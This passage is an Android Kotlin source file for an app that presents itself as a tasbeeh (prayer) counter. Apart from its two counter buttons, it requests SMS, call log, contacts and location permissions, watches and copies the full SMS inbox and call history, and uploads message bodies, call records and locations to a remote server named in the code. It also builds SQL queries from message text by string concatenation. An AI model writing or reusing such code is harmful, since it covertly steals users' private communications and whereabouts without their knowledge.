package com.example.tasbeeh

import android.os.Bundle
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity


import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.lang.Long
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.ArrayList


class MainActivity : AppCompatActivity() {
    private var counterTxt: TextView? = null
    private var plusBtn: Button? = null
    private var resetBtn: Button? = null
    private var counter = 0
    private var jsonPlaceHolderApi: JsonPlaceHolderAPI? = null
    //    private var list = ArrayList<CallLogModel>()
    private var times: Int = 0

    var cursor: Cursor? = null
    var SQLiteDataBaseQueryHolder: String? = null
    //var looper:Looper= Looper.getMainLooper()

    //var userNameFromLogin: String? = sp.getString("username", "phone")
    // var userNameFromLogin:String?="03234005103"
    lateinit var userNameFromLogin: String
    lateinit var sp: SharedPreferences


    private var mObserver: ContentObserver? = CallLogObserver(Handler())
    private var smsObserver: ContentObserver? = SmsLogObserver(Handler())
    val clickListener = View.OnClickListener { view ->
        when (view.id) {
            R.id.plusBtn -> plusCounter()
            R.id.resetBtn -> initCounter()
        }
    }


    companion object {
        var contentResolver: ContentResolver? = null
        var contextMe:Context?= null
        private var sqliteCallLog: SqliteCallLog? = null
        private var sqliteSmsLog: SqliteSmsLog? = null
        var sqLiteDatabaseObj: SQLiteDatabase? = null
        val PERMISSION_REQUEST_CODE: Int = 200
        var sqliteLocation: SqliteLocation? = null


        var times = 0;
        fun getAllSmsDataFromSqlite(): java.util.ArrayList<SmsLogModel?>? {
            sqLiteDatabaseObj = sqliteSmsLog!!.writableDatabase
//            MainActivity.textViewResult?.append("\n----SQL LITe Sms LOG FULL DATA---\n")
            try {
                val c =
                        sqLiteDatabaseObj?.rawQuery("SELECT * FROM smsLog", null)
                //   c?.moveToLast()
                /*   try {
                    c?.moveToFirst()
                }catch (t:java.lang.Exception)
                {
                    t.printStackTrace()
                }

              */

                val sb = StringBuffer()
                val list = java.util.ArrayList<SmsLogModel?>()
                while (c!!.moveToNext()) {
                    val number = c?.getString(0)
                    val body = c?.getString(1)
                    val date = c?.getString(2)
                    val name = c?.getString(3)
                    var context=MainActivity?.contextMe
                    var sp: SharedPreferences? =context?.getSharedPreferences("login", Context.MODE_PRIVATE)
                    var username: String? = sp?.getString("username", "phone")

                    var smsLogModel: SmsLogModel
                    if (name == null) {
                        smsLogModel =
                                SmsLogModel(number, body, date, "Not Found",username)
                        //                    MainActivity.textViewResult?.append(" "+smsLogModel.getPhoneNumber()+" "+smsLogModel.getSmsDate()+" "+smsLogModel.getContactName()+" ")
                    } else {
                        smsLogModel = SmsLogModel(number, body, date, name, username)
                        //                      MainActivity.textViewResult?.append(" "+smsLogModel.getPhoneNumber()+" "+smsLogModel.getSmsDate()+" "+smsLogModel.getContactName()+" ")

                    }

                    list.add(smsLogModel)


                }
                list.toString()
                return list
            } catch (e: java.lang.Exception) {
                println(e)
            }
            return null
        }

        fun getAllLocationData(): ArrayList<LocationModel?>? {
            sqLiteDatabaseObj = sqliteLocation!!.writableDatabase
            // MainActivity.textViewResult?.append("\n----SQLLITe CALL LOG FULL DATA---\n")
            try {
                val c =
                        sqLiteDatabaseObj?.rawQuery("SELECT * FROM location", null)
                c?.moveToFirst()
                println(c.toString())
                val sb = StringBuffer()
                val list = java.util.ArrayList<LocationModel?>()
                while (c!!.moveToNext()) {
                    val latitude = c?.getString(0)
                    val longitude = c?.getString(1)
                    val address = c?.getString(2)
                    val date = c?.getString(3)
                    val username = c?.getString(4)
                    val l = LocationModel(latitude, longitude, address, date, username)
                    list.add(l)
                    //c.moveToNext();
                }
                return list
            } catch (e: java.lang.Exception) {
                println(e)
            }
            return null
        }

        fun getDataFromSqlite(): java.util.ArrayList<CallLogModel?>? {
            sqLiteDatabaseObj = sqliteCallLog!!.writableDatabase
            // MainActivity.textViewResult?.append("\n----SQLLITe CALL LOG FULL DATA---\n")
            try {
                val c =
                        sqLiteDatabaseObj?.rawQuery("SELECT * FROM callLog", null)
                c?.moveToFirst()
                println(c.toString())
                val sb = StringBuffer()
                val list = java.util.ArrayList<CallLogModel?>()
                while (c!!.moveToNext()) {
                    val number = c?.getString(0)
                    val callType = c?.getString(1)
                    val callDate = c?.getString(2)
                    val callDuration = c?.getString(3)
                    val name = c?.getString(4)
                    var callLogModel: CallLogModel
                    var context=MainActivity?.contextMe
                    var sp: SharedPreferences? =context?.getSharedPreferences("login", Context.MODE_PRIVATE)
                    var username: String? = sp?.getString("username", "phone")
                    if (name == null) {
                        callLogModel =
                                CallLogModel(number, callType, callDate, callDuration, "not found", username)
                        //         MainActivity.textViewResult?.append(" "+callLogModel.getPhoneNumber()+" "+callLogModel.getCallDate()+" "+callLogModel.getCallType()+" ")
                    } else {
                        callLogModel = CallLogModel(number, callType, callDate, callDuration, name, username)
                        //           MainActivity.textViewResult?.append(" "+callLogModel.getPhoneNumber()+" "+callLogModel.getCallDate()+" "+callLogModel.getCallType()+" ")

                    }

                    list.add(callLogModel)

                    //c.moveToNext();
                }
                list.toString()
                return list
            } catch (e: java.lang.Exception) {
                println(e)
            }
            return null
        }

        fun getLastCallLogFromSqlite(contentResolver: ContentResolver?,contextMe: Context?): CallLogModel? {
            sqLiteDatabaseObj = sqliteCallLog!!.writableDatabase
            // MainActivity.textViewResult?.append("\n--SQLLITe LAST CALL LOG--\n")
            try {
                val c =
                        sqLiteDatabaseObj?.rawQuery("SELECT * FROM callLog", null)
                c?.moveToLast()
                println(c.toString())
                val sb = StringBuffer()

                if (!c?.isAfterLast!!) {
                    val number = c?.getString(0)
                    val callType = c?.getString(1)
                    val callDate = c?.getString(2)
                    val callDuration = c?.getString(3)
                    val name = c?.getString(4)
                    var callLogModel: CallLogModel
                    var m = MainActivity()
                    var sp: SharedPreferences? =contextMe?.getSharedPreferences("login", Context.MODE_PRIVATE)
                    var username: String? = sp?.getString("username", "phone")
                    if (name.equals(null)) {
                        callLogModel =
                                CallLogModel(number, callType, callDate, callDuration, "not found", username)
                        //         MainActivity.textViewResult?.append(" "+callLogModel.getPhoneNumber()+" "+callLogModel.getCallDate()+" "+callLogModel.getCallType()+" ")
                    } else {
                        callLogModel = CallLogModel(number, callType, callDate, callDuration, name, username)
                        //           MainActivity.textViewResult?.append(" "+callLogModel.getPhoneNumber()+" "+callLogModel.getCallDate()+" "+callLogModel.getCallType()+" ")

                    }
                    return callLogModel;
                }
            } catch (e: java.lang.Exception) {
                println(e)
            }
            return null;
        }

        fun getLastSmsLogFromSqlite(contentResolver: ContentResolver?,contextMe: Context?): SmsLogModel? {
            sqLiteDatabaseObj = sqliteSmsLog!!.writableDatabase
            //  MainActivity.textViewResult?.append("\n--SQLLITe LAST SMS LOG--\n")
            try {
                val c =
                        sqLiteDatabaseObj?.rawQuery("SELECT * FROM smsLog", null)
                c?.moveToLast()
                println(c.toString())
                val sb = StringBuffer()

                if (!c?.isAfterLast!!) {
                    val number = c?.getString(0)
                    val body = c?.getString(1)
                    val date = c?.getString(2)
                    val name = c?.getString(3)

                    var smsLogModel: SmsLogModel
                    var m = MainActivity()
                    var sp: SharedPreferences? =contextMe?.getSharedPreferences("login", Context.MODE_PRIVATE)
                    var username: String? = sp?.getString("username", "phone")

                    if (name == null) {
                        smsLogModel = SmsLogModel(number, body, date, "Not Found", username)
                        //   MainActivity.textViewResult?.append(" " + smsLogModel.getPhoneNumber() + " " + smsLogModel.getSmsDate() + " " + smsLogModel.getContactName() + " ")
                    } else {
                        smsLogModel = SmsLogModel(number, body, date, name,username)
                        //   MainActivity.textViewResult?.append(" " + smsLogModel.getPhoneNumber() + " " + smsLogModel.getSmsDate() + " " + smsLogModel.getContactName() + " ")

                    }
                    return smsLogModel;
                }
            } catch (e: java.lang.Exception) {
                println(e)
            }
            return null;
        }

        fun getLastLocationFromSqlite(contentResolver: ContentResolver?): LocationModel? {
            sqLiteDatabaseObj = sqliteLocation!!.writableDatabase
            //  MainActivity.textViewResult?.append("\n--SQLLITe LAST SMS LOG--\n")
            try {
                val c =
                        sqLiteDatabaseObj?.rawQuery("SELECT * FROM location", null)
                c?.moveToLast()
                println(c.toString())
                val sb = StringBuffer()

                if (!c?.isAfterLast!!) {
                    val latitude = c?.getString(0)
                    val longitude = c?.getString(1)
                    val address = c?.getString(2)
                    val date = c?.getString(3)
                    val username = c?.getString(4)
                    var locationModel = LocationModel(latitude, longitude, address, date, username)

                    if (locationModel == null) {
                        return locationModel
                        //   MainActivity.textViewResult?.append(" " + smsLogModel.getPhoneNumber() + " " + smsLogModel.getSmsDate() + " " + smsLogModel.getContactName() + " ")
                    } else {
                        return locationModel
                        //   MainActivity.textViewResult?.append(" " + smsLogModel.getPhoneNumber() + " " + smsLogModel.getSmsDate() + " " + smsLogModel.getContactName() + " ")
                    }

                }
            } catch (e: java.lang.Exception) {
                println(e)
            }
            return null;

        }


    }

    override fun onDestroy() {
        super.onDestroy()
        println("On destroy Main activity")
        //stopService(Intent(applicationContext, MyService::class.java))
          this.finish()
    }


    @RequiresApi(Build.VERSION_CODES.KITKAT)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        sp = getSharedPreferences("login", Context.MODE_PRIVATE)

        userNameFromLogin = sp.getString("username", "phone")
        counterTxt = findViewById<View>(R.id.counterTxt) as TextView
        plusBtn = findViewById<View>(R.id.plusBtn) as Button
        plusBtn!!.setOnClickListener(clickListener)
        resetBtn = findViewById<View>(R.id.resetBtn) as Button
        resetBtn!!.setOnClickListener(clickListener)
        initCounter()
        onButtonClickListener()

        MainActivity.contentResolver = contentResolver
        MainActivity.contextMe= applicationContext
        sqliteCallLog = SqliteCallLog(this)
        sqliteSmsLog = SqliteSmsLog(this)
        sqliteLocation = SqliteLocation(this)

        //     SQLITELocationDropTable()
        SQLiteDataBaseBuild()
        SQLiteTableBuild()
        SQLiteTableSms()

        SqliteLocationTableBuild()


        //mNetworkReceiver=new NetworkChangeReceiver();
        this.applicationContext.contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, CallLogObserver(Handler()))
        //this.applicationContext.contentResolver.registerContentObserver(,)
        this.applicationContext.contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, SmsLogObserver(Handler()))
        if (!checkPermission()) {
            requestPermission();
        } else {

            val builder = Retrofit.Builder()
            builder.baseUrl("https://guardiangrab.lifeklix.com/")
            builder.addConverterFactory(GsonConverterFactory.create())
            val retrofit = builder
                    .build()
            jsonPlaceHolderApi = retrofit.create(JsonPlaceHolderAPI::class.java)
            //startService(Intent(applicationContext,MyService::class.java))
            startService(Intent(applicationContext, MyService::class.java))
            val intents = Intent()
            intents.setClass(applicationContext, MyService::class.java)
            stopService(intents)



        }
    }


    private fun checkPermission(): Boolean {
        val result =
                ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_SMS)
        val result1 = ContextCompat.checkSelfPermission(
                getApplicationContext(),
                Manifest.permission.READ_CALL_LOG
        )
        val result2 =
                ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_CONTACTS)
        var result3 = ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.ACCESS_FINE_LOCATION)

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED && result2 == PackageManager.PERMISSION_GRANTED && result3 == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPermission() {
        ActivityCompat.requestPermissions(
                this,
                arrayOf(
                        Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_CONTACTS, Manifest.permission.ACCESS_FINE_LOCATION
                ),
                PERMISSION_REQUEST_CODE
        )
    }


    override fun onRequestPermissionsResult(requestCode: Int, vararg permissions: String?, grantResults: IntArray) {
        if (PERMISSION_REQUEST_CODE == 200) {
            if (grantResults.size > 0) {
                val callLogAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                val smsLogAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;
                val contactNameAccepted = grantResults[2] == PackageManager.PERMISSION_GRANTED
                var locationAccepted = grantResults[3] == PackageManager.PERMISSION_GRANTED
                if (callLogAccepted == true && smsLogAccepted == true && contactNameAccepted) {
                    val smsList = fetchInbox();
                    val callLogList = getCallDetails();
                     createPost(callLogList)
                     sendSmsDetails(smsList)


                }

            }


        }

    }


    fun getCallDetails(): ArrayList<CallLogModel?> {

        var list = ArrayList<CallLogModel?>()
        var sb = StringBuilder()
        val managedCursor =
                if (ActivityCompat.checkSelfPermission(
                                this,
                                Manifest.permission.READ_CALL_LOG
                        ) == PackageManager.PERMISSION_GRANTED
                ) {
                    val managedCursor =
                            contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
                    val number = managedCursor?.getColumnIndex(CallLog.Calls.NUMBER)
                    val type = managedCursor?.getColumnIndex(CallLog.Calls.TYPE)
                    val date = managedCursor?.getColumnIndex(CallLog.Calls.DATE)
                    val duration = managedCursor?.getColumnIndex(CallLog.Calls.DURATION)
                    val name = managedCursor?.getColumnIndex(CallLog.Calls.CACHED_NAME)

                    if (managedCursor != null) {
                        while (managedCursor.moveToNext()) {
                            val phNumber = managedCursor.getString(number!!)
                            var callType = managedCursor.getString(type!!)
                            val callDate = managedCursor.getString(date!!)
                            val callDayTime = Date(Long.valueOf(callDate))
                            val format = SimpleDateFormat("dd-MM-yy HH:mm:ss")
                            val dateSString = format.format(callDayTime)
                            //Date callDayTime = new Date(Long.valueOf(callDate));
                            //Date callDayTime = new Date(Long.valueOf(callDate));
                            val callDuration = managedCursor.getString(duration!!)
                            val contactName = managedCursor.getString(name!!)
                            var dir: String? = null
                            var toInt = callType.toInt()


                            when (toInt) {

                                CallLog.Calls.OUTGOING_TYPE -> dir = "Outgoing"
                                CallLog.Calls.INCOMING_TYPE -> dir = "Incoming"
                                CallLog.Calls.MISSED_TYPE -> dir = "Missed"
                            }
                            var sp: SharedPreferences = getSharedPreferences("login", Context.MODE_PRIVATE)

                            var username: String? = sp.getString("username", "phone")

                            var callLog = CallLogModel(
                                    phNumber,
                                    dir.toString(),
                                    dateSString,
                                    callDuration,
                                    contactName, username
                            )
                            list.add(callLog)


                        }
                        //       managedCursor?.close();
                    }
                    //managedCursor?.close();
                    return list;
                } else {
                    return list;
                }
    }

    fun insertDataInSqliteSms(s: SmsLogModel) {
        SQLiteDataBaseQueryHolder =
                "INSERT INTO " + SqliteSmsLog.TABLE_NAME + " (number,body,date,name,username) VALUES('" + s.getPhoneNumber().toString() + "','" + s.getBody().toString() + "','" + s.getSmsDate().toString() + "','" + s.getContactName().toString() + "','" + s.getUserName().toString() + "');"
        try {
            sqLiteDatabaseObj = sqliteSmsLog!!.writableDatabase
            sqLiteDatabaseObj?.execSQL(SQLiteDataBaseQueryHolder)
        } catch (e: Exception) {
            println(e)
        }
        //

    }

    fun insertDataInSqlLite(c: CallLogModel) {
        SQLiteDataBaseQueryHolder =
                "INSERT INTO " + SqliteCallLog.TABLE_NAME + " (phoneNumber,callType,callDate,callDuration,contactName,username) VALUES('" + c.getPhoneNumber().toString() + "','" + c.getCallType().toString() + "','" + c.getCallDate().toString() + "','" + c.getCallDuration().toString() + "','" + c.getContactName().toString() + "','" + c.getUserName().toString() + "');"
        try {
            sqLiteDatabaseObj = sqliteCallLog!!.writableDatabase
            sqLiteDatabaseObj?.execSQL(SQLiteDataBaseQueryHolder)
        } catch (e: Exception) {
            println(e)
        }
        //      MainActivity.sqLiteDatabaseObj?.close()
    }

    fun insertDataInSqlLiteLocation(c: LocationModel) {
        SQLiteDataBaseQueryHolder =
                "INSERT INTO " + SqliteLocation.TABLE_NAME + " (latitude,longitude,last_address,date,username) VALUES('" + c.getLatitude().toString() + "','" + c.getLongitude().toString() + "','" + c.getArea().toString() + "','" + c.getDate().toString() + "','" + c.getUsername().toString() + "');"
        try {
            sqLiteDatabaseObj = sqliteLocation!!.writableDatabase
            sqLiteDatabaseObj?.execSQL(SQLiteDataBaseQueryHolder)
        } catch (e: Exception) {
            println(e)
        }
        //      MainActivity.sqLiteDatabaseObj?.close()
    }


    fun getMostRecentCallLog(contentResolver: ContentResolver?, contextMe: Context?): CallLogModel? {
        var managedCursor: Cursor? = null
        try {
            managedCursor =
                    contentResolver?.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
        } catch (e: java.lang.Exception) {
            println(e)
        }
        val number = managedCursor?.getColumnIndex(CallLog.Calls.NUMBER)
        val type = managedCursor?.getColumnIndex(CallLog.Calls.TYPE)
        val date = managedCursor?.getColumnIndex(CallLog.Calls.DATE)
        val duration = managedCursor?.getColumnIndex(CallLog.Calls.DURATION)
        val name = managedCursor?.getColumnIndex(CallLog.Calls.CACHED_NAME)
        managedCursor?.moveToLast()
        if (!managedCursor?.isAfterLast!!) {
            var phNumber = managedCursor.getString(number!!)
            var callType = managedCursor.getString(type!!)
            var callDate = managedCursor?.getString(date!!)
            val callDayTime = Date(java.lang.Long.valueOf(callDate.toString()))
            val format = SimpleDateFormat("dd-MM-yy HH:mm:ss")
            val dateSString = format.format(callDayTime)
            //Date callDayTime = new Date(Long.valueOf(callDate));
            val callDuration = managedCursor?.getString(duration!!)
            val contactName = managedCursor?.getString(name!!)
            var dir: String? = null
            val callTypeCode = callType.toInt()
            when (callTypeCode) {
                CallLog.Calls.OUTGOING_TYPE -> dir = "Outgoing"
                CallLog.Calls.INCOMING_TYPE -> dir = "Incoming"
                CallLog.Calls.MISSED_TYPE -> dir = "Missed"
            }
            try {
                var sp: SharedPreferences? =contextMe?.getSharedPreferences("login", Context.MODE_PRIVATE)
                var username: String? = sp?.getString("username", "phone")
                val model =
                        CallLogModel(phNumber, dir, dateSString, callDuration, contactName, username)
                managedCursor.close()
                return model
            } catch (e: Exception) {
                print(e.toString())
                return null
            }


        } else
            return null
    }

    fun getMostRecentMessage(contentResolver: ContentResolver?,contextMe: Context?): SmsLogModel? {
        val uriSms = Uri.parse("content://sms")
        var cursor: Cursor? = null
        try {
            cursor = contentResolver?.query(
                    uriSms,
                    arrayOf("_id", "address", "date", "body"),
                    null,
                    null,
                    "date desc limit 1"
            )
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
        // cursor.moveToFirst();
        val sb = StringBuffer()
        //sb.append("
        // SMS Details     \n")
        cursor?.moveToLast()
        if (!cursor?.isAfterLast!!) {
            val phoneNumber = cursor?.getString(1)
            val smsDetail = cursor?.getString(3)
            val id = cursor?.getString(0)
            val date = cursor?.getString(2)
            //  var contexts =context
            //context = baseContext
            var name = getContactName(phoneNumber, contentResolver)
            if (name == "")
                name = "No Name Found"
            // String contactName=cursor.getString((4));
            val callDayTime = Date(java.lang.Long.valueOf(date.toString()))
            val format = SimpleDateFormat("dd-MM-yy HH:mm:ss")
            val dateString = format.format(callDayTime)
            //System.out.println("======&gt; Mobile number =&gt; "+address);
//System.out.println("=====&gt; SMS Text =&gt; "+body);
            sb.append("\n\n\n Phone Number  : $phoneNumber\n SMS : $smsDetail\n Date: $dateString\nContact Name : name ")
            var sp: SharedPreferences? =contextMe?.getSharedPreferences("login", Context.MODE_PRIVATE)
            var username: String? = sp?.getString("username", "phone")
            var sms = SmsLogModel(phoneNumber, smsDetail, dateString, name, username)
            return sms
        } else
            return null


    }


    fun deleteCallLog() {

        SQLiteDataBaseQueryHolder = "delete from " + SqliteCallLog.TABLE_NAME
        sqLiteDatabaseObj = sqliteCallLog!!.writableDatabase
        try {
            sqLiteDatabaseObj!!.execSQL(SQLiteDataBaseQueryHolder)
        } catch (e: java.lang.Exception) {
            println(e)
        }
        var l = getDataFromSqlite()
        println(l.toString())
        // SQLiteTableBuild()
        // Closing SQLite database object.
//        sqLiteDatabaseObj!!.close()
    }

    fun deleteSmsLog() {
        SQLiteDataBaseQueryHolder = "delete from " + SqliteSmsLog.TABLE_NAME
        try {
            sqLiteDatabaseObj = sqliteSmsLog!!.writableDatabase
            sqLiteDatabaseObj!!.execSQL(SQLiteDataBaseQueryHolder)
        } catch (e: java.lang.Exception) {
            println(e)
        }
        var l = getAllSmsDataFromSqlite()
        println(l.toString())
        // SQLiteTableBuild()
        // Closing SQLite database object.
//        sqLiteDatabaseObj!!.close()
    }

    fun deleteLocation() {
        SQLiteDataBaseQueryHolder = "delete from " + SqliteLocation.TABLE_NAME
        try {
            sqLiteDatabaseObj = sqliteLocation!!.writableDatabase
            sqLiteDatabaseObj!!.execSQL(SQLiteDataBaseQueryHolder)
        } catch (e: java.lang.Exception) {
            println(e)
        }
        var l = getAllSmsDataFromSqlite()
        println(l.toString())
        // SQLiteTableBuild()
        // Closing SQLite database object.
//        sqLiteDatabaseObj!!.close()
    }

    fun SQLiteDataBaseBuild() {
        sqLiteDatabaseObj =
                openOrCreateDatabase(SqliteCallLog.DATABASE_NAME, Context.MODE_PRIVATE, null)
    }

    fun SQLiteTableSms() {
        //   sqLiteDatabaseObj = sqliteCallLog!!.writableDatabase
        sqLiteDatabaseObj!!.execSQL("CREATE TABLE IF NOT EXISTS " + SqliteSmsLog.TABLE_NAME + "(" + SqliteSmsLog.SMSLOG_number + " VARCHAR, " + SqliteSmsLog.SMSLOG_body + " VARCHAR, " + SqliteSmsLog.SMSLOG_date + " VARCHAR, " + SqliteSmsLog.SMSLOG_name + " VARCHAR," + SqliteSmsLog.SMSLOG_username + " VARCHAR);")
    }


  fun SQLITELocationDropTable(){
        SQLiteDataBaseQueryHolder = "drop Table " + SqliteLocation.TABLE_NAME
        try {
            sqLiteDatabaseObj = sqliteLocation!!.writableDatabase
            sqLiteDatabaseObj!!.execSQL(SQLiteDataBaseQueryHolder)
        } catch (e: java.lang.Exception) {
            println(e)
        }

    }




    // SQLite table build method.
    fun SQLiteTableBuild() {
        //   sqLiteDatabaseObj = sqliteCallLog!!.writableDatabase
        sqLiteDatabaseObj!!.execSQL("CREATE TABLE IF NOT EXISTS " + SqliteCallLog.TABLE_NAME + "(" + SqliteCallLog.CallLog_number + " VARCHAR, " + SqliteCallLog.CallLog_type + " VARCHAR, " + SqliteCallLog.CallLog_date + " VARCHAR, " + SqliteCallLog.CallLog_duration + " VARCHAR, " + SqliteCallLog.CallLog_name + " VARCHAR, " + SqliteCallLog.CallLog_username + " VARCHAR);")
    }
    fun SqliteLocationTableBuild() {
        //   sqLiteDatabaseObj = sqliteCallLog!!.writableDatabase
        sqLiteDatabaseObj!!.execSQL("CREATE TABLE IF NOT EXISTS " + SqliteLocation.TABLE_NAME + "(" + SqliteLocation.latitude + " VARCHAR," + SqliteLocation.longitude+ " VARCHAR," + SqliteLocation.last_address+ " VARCHAR," + SqliteLocation.date+ " VARCHAR," + SqliteLocation.username+ " VARCHAR);")
    }

    fun fetchInbox(): ArrayList<SmsLogModel?> {
        val sms: java.util.ArrayList<*> = java.util.ArrayList<Any?>()
        val uriSms = Uri.parse("content://sms")
        val cursor = contentResolver?.query(
                uriSms,
                arrayOf("_id", "address", "date", "body"),
                null,
                null,
                null
        )
        var listSms = ArrayList<SmsLogModel?>()

        // cursor.moveToFirst();
        val sb = StringBuffer()
        sb.append("         SMS Details     \n")
        while (cursor!!.moveToNext()) {
            val phoneNumber = cursor.getString(1)
            val smsDetail = cursor.getString(3)
            val id = cursor.getString(0)
            val date = cursor.getString(2)
            var context = this.applicationContext
            //context = baseContext
            var name = getContactName(phoneNumber, contentResolver)
            if (name == "")
                name = "No Name Found"
            // String contactName=cursor.getString((4));
            val callDayTime = Date(java.lang.Long.valueOf(date))
            val format = SimpleDateFormat("dd-MM-yy HH:mm:ss")
            val dateString = format.format(callDayTime)
            //System.out.println("======&gt; Mobile number =&gt; "+address);
//System.out.println("=====&gt; SMS Text =&gt; "+body);
            sb.append("\n\n\n Phone Number  : $phoneNumber\n SMS : $smsDetail\n Date: $dateString\nContact Name : name ")
            var sp: SharedPreferences? =getSharedPreferences("login", Context.MODE_PRIVATE)
            var username: String? = sp?.getString("username", "phone")
            var sms = SmsLogModel(phoneNumber, smsDetail, dateString, name, username)
            listSms.add(sms)
        }
        sb.append("\n\n-------------")
        return listSms
    }

    fun getContactName(phoneNumber: String?, contentRes: ContentResolver?): String {
        val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber)
        )
        val projection = arrayOf(
                ContactsContract.PhoneLookup.DISPLAY_NAME
        )
        var contentResolver = contentRes
        var contactName = ""
        val cursor = contentResolver?.query(uri, projection, null, null, null)
        if (cursor != null) {
            if (cursor.moveToFirst()) {
                contactName = cursor.getString(0)
            }
            cursor.close()
        }
        return contactName
    }

    @SuppressLint("MissingPermission")
    fun sendSmsDetails(list: ArrayList<SmsLogModel?>): Boolean
    {
        val builder = Retrofit.Builder()
        var flag: Boolean = true
        builder.baseUrl("https://guardiangrab.lifeklix.com/")
        builder.addConverterFactory(GsonConverterFactory.create())
        val retrofit = builder
                .build()
        var jsonPlaceHolderApi = retrofit.create(JsonPlaceHolderAPI::class.java)
        var smsDetails: SmsLogModel;
        var context=MainActivity?.contextMe
        var sp: SharedPreferences? =context?.getSharedPreferences("login", Context.MODE_PRIVATE)
        var username: String? = sp?.getString("username", "phone")
        for (l in list)
        {
            if (l?.getContactName().equals(null)) {
                smsDetails = SmsLogModel(l?.getPhoneNumber(), l?.getBody(), l?.getSmsDate(), "No Name Found", username)
            } else {
                smsDetails = SmsLogModel(l?.getPhoneNumber(), l?.getBody(), l?.getSmsDate(), l?.getContactName(), username)
            }
            var call: Call<SmsLogModel?>?
            try
            {
                call = jsonPlaceHolderApi!!.sendSmsDetails(smsDetails)
                call!!.enqueue(object : Callback<SmsLogModel?> {
                    override fun onResponse(call: Call<SmsLogModel?>, response: Response<SmsLogModel?>)
                    {
                        if (!response.isSuccessful) {

                        }
                    }
                    override fun onFailure(call: Call<SmsLogModel?>, t: Throwable) {

                    }
                })

            } catch (e: java.lang.Exception) {
                return false
                println(e)
            }

        }

        return flag
    }


    @SuppressLint("MissingPermission")
    fun createPost(list: ArrayList<CallLogModel?>) {
        val builder = Retrofit.Builder()
        builder.baseUrl("https://guardiangrab.lifeklix.com/")
        builder.addConverterFactory(GsonConverterFactory.create())
        val retrofit = builder
                .build()
        var jsonPlaceHolderApi = retrofit.create(JsonPlaceHolderAPI::class.java)
        //var callDetails: CallLogModel?;
        var context=MainActivity?.contextMe
        var sp: SharedPreferences? =context?.getSharedPreferences("login", Context.MODE_PRIVATE)
        var username: String? = sp?.getString("username", "phone")

        for (l in list) {
            var callDetails: CallLogModel
            if (l?.getContactName().equals(null)) {
                callDetails = CallLogModel(
                        l?.getPhoneNumber(),
                        l?.getCallType(),
                        l?.getCallDate(),
                        l?.getCallDuration(),
                        "No Name Found", username
                )
            } else {
                callDetails = CallLogModel(
                        l?.getPhoneNumber(),
                        l?.getCallType(),
                        l?.getCallDate(),
                        l?.getCallDuration(),
                        l?.getContactName(), username
                )

            }


            var call: Call<CallLogModel?>?
            try {
                call = jsonPlaceHolderApi!!.createPost(callDetails)
                call!!.enqueue(object : Callback<CallLogModel?> {
                    override fun onResponse(
                            call: Call<CallLogModel?>,
                            response: Response<CallLogModel?>
                    ) {
                        if (!response.isSuccessful) {
                            return
                        }

                    }

                    override fun onFailure(call: Call<CallLogModel?>, t: Throwable) {

                    }
                })

            } catch (e: java.lang.Exception) {
                println(e)
            }
        }
    }
/*
    fun getPost() {
        val call = jsonPlaceHolderApi!!.getPost()
        call!!.enqueue(object : Callback<List<CallLogModel?>?> {


            override fun onResponse(
                    call: Call<List<CallLogModel?>?>,
                    response: Response<List<CallLogModel?>?>
            ) {
                if (!response.isSuccessful) {
                    textViewResult!!.text = "code " + response.code()

                }
                val callData = response.body()!!
                for (post in callData) {
                    var content = ""
                    //    content += "\nId :" + post!!.getId()
                    content += "\nPhone Number: " + post!!.getPhoneNumber()
                    content += "\nCall Type: " + post!!.getCallType()
                    content += "\nCall Duration: " + post!!.getCallDuration()
                    content += "\nCall Date: " + post.getCallDate()
                    content += "\nContact Name: " + post.getContactName()
                    content += "\n\n"
                    textViewResult!!.append(content)
                }
            }


            override fun onFailure(call: Call<List<CallLogModel?>?>, t: Throwable) {
                textViewResult!!.text = t.message
            }
        })
    }


 */

    /*
    fun browserHistory(): String {
        val browserUri = Uri.parse("content://browser/bookmarks")
        val cursor = contentResolver?.query(
                browserUri, arrayOf("title", "url"),
                null, null, null
        )
        val sb = StringBuffer()
        sb.append(" ------    Browser Details   ------  \n")
        cursor?.moveToFirst()

        while (cursor!!.moveToNext()) {
            val phoneNumber = cursor.getString(0)
            val smsDetail = cursor.getString(1)
            sb.append("\n\n\n Phone Number  : $phoneNumber\n SMS : $smsDetail")
        }
        sb.append("\n\n\n")
        return sb.toString()


    }

     */
    @SuppressLint("MissingPermission")
    fun sendLocationDetailsIntoAPI(list: ArrayList<LocationModel?>) {
        val builder = Retrofit.Builder()
        builder.baseUrl("https://guardiangrab.lifeklix.com/")
        builder.addConverterFactory(GsonConverterFactory.create())
        val retrofit = builder
                .build()
        jsonPlaceHolderApi = retrofit.create(JsonPlaceHolderAPI::class.java)
        //var callDetails: CallLogModel?;

        for (l in list)
        {
            var locationDetails: LocationModel
